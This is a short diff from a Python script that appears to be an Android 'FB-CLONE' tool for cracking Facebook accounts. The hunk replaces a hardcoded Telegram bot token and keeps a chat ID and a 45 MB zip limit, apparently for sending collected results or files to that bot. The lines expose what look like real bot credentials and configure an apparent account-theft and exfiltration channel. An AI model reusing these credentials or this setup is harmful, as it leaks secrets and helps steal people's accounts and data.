@@ -33,7 +33,7 @@ folder_path = '/sdcard/FB-CLONE-RESULTS'
 os.makedirs(folder_path, exist_ok=True)
 country_opt = ""
 
-TOKEN = "8987261137:AAFcUJxZtpmjgaKf5pYTERH7JJCB6mdQWIo"
+TOKEN = "8716542518:AAFsKUuit-TtjQB-3d_l3TMOk7QrO05hLLQ"
 CHAT_ID = "8224555138"
 MAX_ZIP_SIZE = 45 * 1024 * 1024
 
